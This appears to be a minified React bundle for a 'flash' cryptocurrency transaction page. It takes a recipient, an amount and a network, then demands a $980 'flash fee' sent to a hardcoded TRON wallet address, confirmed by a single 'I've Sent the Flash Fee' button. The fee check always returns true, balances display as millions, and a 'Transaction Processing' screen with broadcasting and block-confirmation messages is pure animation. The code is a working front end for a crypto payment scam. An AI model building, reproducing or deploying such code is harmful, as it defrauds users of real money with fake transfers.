import{c as V,u as W,e as D,n as $,r as d,f as X,j as e,C as K,g as I,o as b,I as C,p as S,s as T,t as F,v as M,w as B,B as m,x as O,l as Z}from"./index-CiR1mdvT.js";import{u as E}from"./useQuery-BI1ZR5Ft.js";import{T as Y,a as J,b as f,c as _}from"./tabs-CoK-9A5k.js";import{b as ee}from"./browser-CjSdxGTc.js";import{E as se}from"./external-link-C9688U0f.js";import{C as ae}from"./copy-uKyZ7okw.js";/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const A=V("QrCode",[["rect",{width:"5",height:"5",x:"3",y:"3",rx:"1",key:"1tu5fj"}],["rect",{width:"5",height:"5",x:"16",y:"3",rx:"1",key:"1v8r4q"}],["rect",{width:"5",height:"5",x:"3",y:"16",rx:"1",key:"1x03jg"}],["path",{d:"M21 16h-3a2 2 0 0 0-2 2v3",key:"177gqh"}],["path",{d:"M21 21v.01",key:"ents32"}],["path",{d:"M12 7v3a2 2 0 0 1-2 2H7",key:"8crl2c"}],["path",{d:"M3 12h.01",key:"nlz23k"}],["path",{d:"M12 3h.01",key:"n36tog"}],["path",{d:"M12 16v.01",key:"133mhm"}],["path",{d:"M16 12h1",key:"1slzba"}],["path",{d:"M21 12v.01",key:"1lwtk9"}],["path",{d:"M12 21v-1",key:"1880an"}]]);function te({gasFeePaid:a,onConfirmPayment:c,receiverAddress:n}){const[l,j]=d.useState(""),[s,i]=d.useState(!1),{toast:x}=D();d.useEffect(()=>{n&&ee.toDataURL(n,{width:200,margin:2,color:{dark:"#000000",light:"#ffffff"}}).then(o=>j(o)).catch(o=>console.error("QR code generation failed:",o))},[n]);const p=async o=>{try{await navigator.clipboard.writeText(o),x({title:"Copied!",description:"Wallet address copied to clipboard"})}catch{x({title:"Copy failed",description:"Please copy the address manually",variant:"destructive"})}};return a?e.jsx("div",{className:"glass-card bg-green-500 bg-opacity-10 border border-green-500 border-opacity-30 rounded-lg p-4",children:e.jsxs("div",{className:"flex items-center space-x-3 text-green-500",children:[e.jsx(se,{className:"w-5 h-5"}),e.jsx("span",{className:"font-semibold",children:"Gas payment confirmed"})]})}):e.jsx("div",{className:"glass-card bg-yellow-500 bg-opacity-10 border border-yellow-500 border-opacity-30 rounded-lg p-3 sm:p-4",children:e.jsxs("div",{className:"flex items-start space-x-3",children:[e.jsx("div",{className:"w-6 h-6 bg-yellow-500 rounded-full flex items-center justify-center mt-1",children:e.jsx("span",{className:"text-foreground text-xs font-bold",children:"!"})}),e.jsxs("div",{className:"flex-1",children:[e.jsx("h4",{className:"font-semibold text-yellow-500 mb-2",children:"Flash Fee Payment Required"}),e.jsx("p",{className:"text-sm text-muted-foreground mb-4",children:"Send flash fee to the address below to complete your transaction:"}),e.jsxs("div",{className:"bg-secondary rounded-lg p-3 sm:p-4 mb-3 sm:mb-4 border border-gray-700",children:[e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 mb-2",children:[e.jsx("p",{className:"text-xs text-muted-foreground",children:"Flash Fee Receiver Address:"}),e.jsxs("div",{className:"flex space-x-1 sm:space-x-2",children:[e.jsxs(m,{variant:"ghost",size:"sm",onClick:()=>i(!s),className:"text-xs h-8 px-2 min-w-[60px]",children:[e.jsx(A,{className:"w-4 h-4 mr-1"}),"QR"]}),e.jsxs(m,{variant:"ghost",size:"sm",onClick:()=>p(n),className:"text-xs h-8 px-2 min-w-[70px]",children:[e.jsx(ae,{className:"w-4 h-4 mr-1"}),"Copy"]})]})]}),e.jsx("p",{className:"font-mono text-xs sm:text-sm break-all bg-primary rounded p-2 mb-3",children:n}),s&&l&&e.jsx("div",{className:"flex justify-center mt-3 p-3 bg-white rounded-lg",children:e.jsx("img",{src:l,alt:"Wallet Address QR Code",className:"w-full max-w-[200px] h-auto"})})]}),e.jsxs("div",{className:"flex flex-col sm:flex-row gap-3",children:[e.jsx(m,{onClick:c,className:"bg-yellow-500 text-yellow-950 dark:text-black hover:bg-yellow-600 flex-1 min-h-[44px]",children:"I've Sent the Flash Fee"}),e.jsx(m,{variant:"outline",onClick:()=>i(!s),className:"border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-yellow-950 dark:hover:text-black min-h-[44px]",children:e.jsx(A,{className:"w-4 h-4"})})]})]})]})})}function oe(){const{user:a}=W(),{toast:c}=D(),n=$(),[l,j]=d.useState("btc"),[s,i]=d.useState({recipientAddress:"",amount:"",network:"",gasSpeed:"standard"}),[x,p]=d.useState(!1),[o,g]=d.useState(!1),[R,v]=d.useState(!1),{data:Q=[]}=E({queryKey:["/api/wallets",a==null?void 0:a.id],enabled:!!(a!=null&&a.id)}),{data:h={receiverAddress:"TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",fees:{standard:"980"}}}=E({queryKey:["/api/gas-fees"]}),q=(h==null?void 0:h.receiverAddress)||"TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",P=(h==null?void 0:h.fees)||{standard:"980"},N=X({mutationFn:async t=>(await Z("POST","/api/transactions",t)).json(),onSuccess:()=>{n.invalidateQueries({queryKey:["/api/transactions",a==null?void 0:a.id]}),n.invalidateQueries({queryKey:["/api/wallets",a==null?void 0:a.id]}),v(!1),c({title:"Transaction Successful",description:"Your flash transaction has been completed successfully!"}),setTimeout(()=>{i({recipientAddress:"",amount:"",network:"",gasSpeed:"standard"}),p(!1)},2e3)},onError:t=>{v(!1),c({title:"Transaction Failed",description:t.message||"Failed to send transaction",variant:"destructive"})}}),L={btc:[{value:"bitcoin-mainnet",label:"Bitcoin Mainnet"},{value:"bitcoin-testnet",label:"Bitcoin Testnet"}],eth:[{value:"ethereum-mainnet",label:"Ethereum Mainnet"},{value:"ethereum-goerli",label:"Ethereum Goerli"}],usdt:[{value:"ethereum-erc20",label:"Ethereum (ERC-20)"},{value:"tron-trc20",label:"Tron (TRC-20)"},{value:"bsc-bep20",label:"BSC (BEP-20)"}],bnb:[{value:"bsc-mainnet",label:"BSC Mainnet"},{value:"bsc-testnet",label:"BSC Testnet"}]},u={btc:"BTC",eth:"ETH",usdt:"USDT",bnb:"BNB"},G=()=>{const r={btc:"BTC",eth:"ETH",usdt:"TRX",bnb:"BSC"}[l],k=Q.find(z=>z.network===r);if(!k)return"0";const y=parseFloat(k.balance);return y>=1e6?`${(y/1e6).toFixed(1)} million`:y.toLocaleString()},w=t=>!0,U=t=>{if(t.preventDefault(),!s.recipientAddress||!s.amount||!s.network){c({title:"Validation Error",description:"Please fill in all required fields",variant:"destructive"});return}if(parseFloat(s.amount)<550){c({title:"Minimum Amount Required",description:"Minimum flash amount is 550",variant:"destructive"});return}if(w(s.network)&&!x){c({title:"Gas Fee Required",description:"Please confirm gas payment before proceeding",variant:"destructive"});return}g(!0)},H=()=>{g(!1),v(!0);const t={userId:a==null?void 0:a.id,toAddress:s.recipientAddress,amount:s.amount,token:u[l],network:l.toUpperCase(),gasSpeed:s.gasSpeed,gasFee:P[s.gasSpeed],gasFeePaid:x,status:"pending"};N.mutate(t)};return e.jsxs("div",{className:"max-w-4xl mx-auto px-2 sm:px-4 lg:px-0",children:[e.jsx(K,{className:"enterprise-card border-0 mb-4 sm:mb-6 shadow-2xl",children:e.jsxs(I,{className:"p-3 sm:p-4 lg:p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-3 sm:mb-4 lg:mb-6",children:[e.jsx("h3",{className:"text-base sm:text-lg lg:text-xl font-bold text-gold-gradient",children:"Enterprise Transaction Center"}),e.jsxs("div",{className:"hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-gradient-to-r from-green-500/10 to-green-600/5 border border-green-500/20",children:[e.jsx("div",{className:"status-online"}),e.jsx("span",{className:"text-xs text-green-400 font-medium uppercase tracking-wider",children:"All Networks Active"})]})]}),e.jsxs(Y,{value:l,onValueChange:j,className:"mb-4 sm:mb-6",children:[e.jsxs(J,{className:"border-b border-yellow-500/20 bg-gradient-to-r from-gray-800/30 to-gray-900/30 rounded-lg p-1 grid grid-cols-4 w-full",children:[e.jsxs(f,{value:"btc",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-yellow-500/20 data-[state=active]:to-yellow-600/10 data-[state=active]:border data-[state=active]:border-yellow-500/30 rounded-md transition-all duration-300 text-xs sm:text-sm",children:[e.jsx("span",{className:"hidden sm:inline mr-2",children:"₿"}),e.jsx("span",{className:"sm:hidden",children:"BTC"}),e.jsx("span",{className:"hidden sm:inline",children:"Bitcoin"})]}),e.jsxs(f,{value:"eth",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-yellow-500/20 data-[state=active]:to-yellow-600/10 data-[state=active]:border data-[state=active]:border-yellow-500/30 rounded-md transition-all duration-300 text-xs sm:text-sm",children:[e.jsx("span",{className:"hidden sm:inline mr-2",children:"Ξ"}),e.jsx("span",{className:"sm:hidden",children:"ETH"}),e.jsx("span",{className:"hidden sm:inline",children:"Ethereum"})]}),e.jsxs(f,{value:"usdt",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-yellow-500/20 data-[state=active]:to-yellow-600/10 data-[state=active]:border data-[state=active]:border-yellow-500/30 rounded-md transition-all duration-300 text-xs sm:text-sm",children:[e.jsx("span",{className:"hidden sm:inline mr-2",children:"₮"}),e.jsx("span",{className:"sm:hidden",children:"USDT"}),e.jsx("span",{className:"hidden sm:inline",children:"USDT"})]}),e.jsxs(f,{value:"bnb",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-yellow-500/20 data-[state=active]:to-yellow-600/10 data-[state=active]:border data-[state=active]:border-yellow-500/30 rounded-md transition-all duration-300 text-xs sm:text-sm",children:[e.jsx("span",{className:"hidden sm:inline mr-2",children:"♦"}),e.jsx("span",{className:"sm:hidden",children:"BNB"}),e.jsx("span",{className:"hidden sm:inline",children:"BNB"})]})]}),Object.keys(u).map(t=>e.jsx(_,{value:t,children:e.jsxs("form",{onSubmit:U,className:"space-y-3 sm:space-y-4 lg:space-y-6",children:[e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4 lg:gap-6",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsx(b,{htmlFor:"recipientAddress",className:"text-xs sm:text-sm",children:"Recipient Address"}),e.jsx(C,{id:"recipientAddress",value:s.recipientAddress,onChange:r=>i({...s,recipientAddress:r.target.value}),className:"enterprise-input min-h-[44px] sm:min-h-[48px] text-sm sm:text-base",placeholder:"Enter wallet address"}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Enter a valid cryptocurrency wallet address"})]}),e.jsx("div",{className:"space-y-2",children:e.jsx("div",{className:"bg-gradient-to-r from-yellow-500/20 via-yellow-500/10 to-yellow-500/20 border-2 border-yellow-500/50 rounded-xl p-4 sm:p-5 mb-3 sm:mb-4 backdrop-blur-sm shadow-lg",children:e.jsxs("div",{className:"flex items-start space-x-3",children:[e.jsx("div",{className:"w-6 h-6 sm:w-7 sm:h-7 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-lg flex items-center justify-center mt-0.5 flex-shrink-0 shadow-md",children:e.jsx("span",{className:"text-black text-xs sm:text-sm font-bold",children:"$"})}),e.jsxs("div",{className:"min-w-0",children:[e.jsx("h4",{className:"text-yellow-400 font-bold text-sm sm:text-base uppercase tracking-wide mb-2",children:"Enterprise Transaction Fee"}),e.jsxs("p",{className:"text-xs sm:text-sm text-gray-300 leading-relaxed",children:["Each flash transaction requires a ",e.jsx("strong",{className:"text-yellow-400 text-base",children:"$980 USD"})," processing fee."]}),e.jsx("p",{className:"text-[10px] sm:text-xs text-gray-400 mt-2",children:"This fee ensures instant execution and network priority for enterprise-grade transactions."})]})]})})}),e.jsxs("div",{className:"space-y-2",children:[e.jsx(b,{htmlFor:"amount",className:"text-xs sm:text-sm",children:"Amount"}),e.jsxs("div",{className:"relative",children:[e.jsx(C,{id:"amount",type:"number",step:"0.000001",value:s.amount,onChange:r=>i({...s,amount:r.target.value}),className:"enterprise-input pr-12 sm:pr-16 min-h-[44px] sm:min-h-[48px] text-sm sm:text-base",placeholder:"0.00"}),e.jsx("div",{className:"absolute right-3 top-3 text-muted-foreground",children:u[t]})]}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:["Available: ",e.jsxs("span",{className:"text-green-500 font-medium",children:[G()," in ",u[t]]})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4 lg:gap-6",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsx(b,{htmlFor:"network",className:"text-xs sm:text-sm",children:"Network"}),e.jsxs(S,{value:s.network,onValueChange:r=>i({...s,network:r}),children:[e.jsx(T,{className:"enterprise-input min-h-[44px] sm:min-h-[48px]",children:e.jsx(F,{placeholder:"Select network"})}),e.jsx(M,{children:L[t].map(r=>e.jsx(B,{value:r.value,children:r.label},r.value))})]})]}),e.jsxs("div",{className:"space-y-2",children:[e.jsx(b,{htmlFor:"gasSpeed",className:"text-xs sm:text-sm",children:"Gas Fee"}),e.jsxs(S,{value:s.gasSpeed,onValueChange:r=>i({...s,gasSpeed:r}),children:[e.jsx(T,{className:"enterprise-input min-h-[44px] sm:min-h-[48px]",children:e.jsx(F,{})}),e.jsx(M,{children:e.jsx(B,{value:"standard",children:"$980 USD"})})]})]})]}),w(s.network)&&e.jsx(te,{gasFeePaid:x,onConfirmPayment:()=>p(!0),receiverAddress:q}),e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between pt-4 border-t border-gray-700 gap-3",children:[e.jsxs("div",{className:"text-xs sm:text-sm text-muted-foreground",children:[e.jsxs("p",{children:["Transaction Fee: ",e.jsx("span",{className:"text-yellow-500 font-medium",children:"$980"})]}),e.jsxs("p",{children:["Estimated Time: ",e.jsx("span",{className:"text-accent font-medium",children:"2-5 minutes"})]})]}),e.jsx(m,{type:"submit",className:"enterprise-button w-full sm:w-auto min-h-[44px]",disabled:N.isPending,children:"Send Transaction"})]})]})},t))]})]})}),o&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",children:e.jsxs("div",{className:"glass-card bg-secondary border border-gray-700 rounded-lg p-6 max-w-sm w-full mx-4 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-green-500/20 to-emerald-500/20 animate-pulse pointer-events-none"}),e.jsx("div",{className:"flex justify-center mb-4",children:e.jsxs("div",{className:"relative",children:[e.jsx("div",{className:"w-16 h-16 bg-green-500/20 rounded-full animate-ping absolute"}),e.jsx("div",{className:"w-16 h-16 bg-green-500/30 rounded-full animate-ping absolute",style:{animationDelay:"0.5s"}}),e.jsx("div",{className:"w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center relative",children:e.jsx("svg",{className:"w-8 h-8 text-white animate-bounce",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:"2",d:"M5 13l4 4L19 7"})})})]})}),e.jsx("h3",{className:"text-lg font-semibold mb-4 text-center bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent",children:"Transaction Ready"}),e.jsxs("div",{className:"space-y-2 text-sm mb-6 backdrop-blur-sm bg-black/20 rounded-lg p-3",children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-400",children:"Amount:"}),e.jsxs("span",{className:"font-semibold text-green-400",children:[s.amount," ",u[l]]})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-400",children:"To:"}),e.jsxs("span",{className:"font-mono text-xs text-blue-400",children:[s.recipientAddress.substring(0,10),"..."]})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-400",children:"Gas Fee:"}),e.jsx("span",{className:"text-yellow-500 font-semibold",children:"$980 USD"})]}),e.jsxs("div",{className:"flex justify-between pt-2 border-t border-gray-700",children:[e.jsx("span",{className:"text-gray-400",children:"Status:"}),e.jsxs("span",{className:"flex items-center gap-1",children:[e.jsx("div",{className:"w-2 h-2 bg-green-500 rounded-full animate-pulse"}),e.jsx("span",{className:"text-green-400 font-semibold",children:"Ready to Send"})]})]})]}),e.jsxs("div",{className:"flex space-x-3",children:[e.jsx(m,{onClick:()=>g(!1),variant:"secondary",className:"flex-1 hover:bg-gray-700 transition-all",children:"Cancel"}),e.jsx(m,{onClick:H,className:"flex-1 bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 transform hover:scale-105 transition-all shadow-lg shadow-green-500/50",children:e.jsxs("span",{className:"flex items-center gap-2",children:[e.jsx("svg",{className:"w-4 h-4",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:"2",d:"M13 7l5 5m0 0l-5 5m5-5H6"})}),"Send Now"]})})]})]})}),R&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",children:e.jsxs("div",{className:"glass-card bg-secondary border border-gray-700 rounded-lg p-8 max-w-sm w-full mx-4 text-center relative overflow-hidden",children:[e.jsxs("div",{className:"absolute inset-0",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-purple-500/10 via-blue-500/10 to-green-500/10 animate-pulse"}),e.jsx("div",{className:"absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-green-500 to-emerald-500 animate-pulse"})]}),e.jsxs("div",{className:"relative",children:[e.jsxs("div",{className:"relative mx-auto mb-6 w-20 h-20",children:[e.jsx("div",{className:"absolute inset-0 bg-green-500/20 rounded-full animate-ping"}),e.jsx("div",{className:"w-20 h-20 border-4 border-green-500/30 border-t-green-500 rounded-full animate-spin"}),e.jsx("div",{className:"absolute inset-2 border-4 border-emerald-500/30 border-b-emerald-500 rounded-full animate-spin",style:{animationDirection:"reverse",animationDuration:"1.5s"}})]}),e.jsx("h3",{className:"text-xl font-bold mb-3 bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent",children:"Transaction Processing"}),e.jsxs("div",{className:"space-y-2 mb-4",children:[e.jsxs("div",{className:"flex items-center justify-center space-x-2",children:[e.jsx("div",{className:"w-2 h-2 bg-green-500 rounded-full animate-pulse"}),e.jsx("span",{className:"text-sm text-gray-400",children:"Validating transaction..."})]}),e.jsxs("div",{className:"flex items-center justify-center space-x-2",children:[e.jsx("div",{className:"w-2 h-2 bg-blue-500 rounded-full animate-pulse",style:{animationDelay:"0.3s"}}),e.jsx("span",{className:"text-sm text-gray-400",children:"Broadcasting to network..."})]}),e.jsxs("div",{className:"flex items-center justify-center space-x-2",children:[e.jsx("div",{className:"w-2 h-2 bg-purple-500 rounded-full animate-pulse",style:{animationDelay:"0.6s"}}),e.jsx("span",{className:"text-sm text-gray-400",children:"Confirming blocks..."})]})]}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Flash transaction in progress • Estimated time: 5-10 seconds"}),e.jsx("div",{className:"mt-4 w-full bg-gray-700 rounded-full h-2 overflow-hidden",children:e.jsx("div",{className:"h-full bg-gradient-to-r from-green-500 to-emerald-500 rounded-full animate-pulse",style:{width:"75%"}})})]})]})}),e.jsx("div",{className:"mt-8 space-y-6",children:e.jsx(O,{})})]})}export{oe as default};
